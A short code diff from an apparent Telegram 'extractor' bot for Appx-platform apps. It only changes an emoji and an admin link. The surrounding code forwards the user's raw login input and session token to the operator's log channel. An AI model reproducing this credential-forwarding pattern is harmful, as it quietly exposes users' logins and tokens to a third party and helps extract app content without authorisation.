@@ -212,7 +212,7 @@ async def appex_v2_txt(app, message, api, name):
         
         if len(FFF) <= 4096:
             editable1 = await message.reply_text(f"𝗔𝗽𝗽𝘅 𝗟𝗼𝗴𝗶𝗻 𝗦𝘂𝗰𝗲𝘀𝘀✅ for {app_name}\n\n {api_base}\n\n`{token}`\n{FFF}")
-            dl=(f"𝗔𝗽𝗽𝘅 𝗟𝗼𝗴𝗶𝗻 𝗦𝘂𝗰𝗲𝘀𝘀✅ for {app_name} \n\n`{api_base}`\n\n`{raw_text}`\n\n`{token}`\n{FFF}")
+            dl=(f"𝗔𝗽𝗽𝘅 𝗟𝗼𝗴𝗶𝗻 𝗦𝘂𝗰𝗲𝘀𝘀✅ for 🔓{app_name} \n\n`{api_base}`\n\n`{raw_text}`\n\n`{token}`\n{FFF}")
             await app.send_message(log_channel, dl)
         else:
             plain_FFF = FFF.replace("**", "").replace("`", "")
@@ -277,7 +277,7 @@ async def appex_v2_txt(app, message, api, name):
             f"⏱️ <b>Extracted In:</b> <code>{elapsed_time:.1f}s</code>\n"
             f"╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯\n\n"
             f"╭━━━━━━━『 <b>💾 DOWNLOAD INFO</b> 』━━━━━━━╮\n"
-            f"👑 <b>Admin:</b> <a href='https://t.me/NOOBHISIR'>LUCIFER ⚡</a>\n"
+            f"👑 <b>Admin:</b> <a href='https://t.me/NOOBHUSIR'>LUCIFER ⚡</a>\n"
             f"⚙️ <b>Extractor:</b> <code>LUCIFER EXTRACTOR ⚡</code>\n"
             f"╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯"
         )
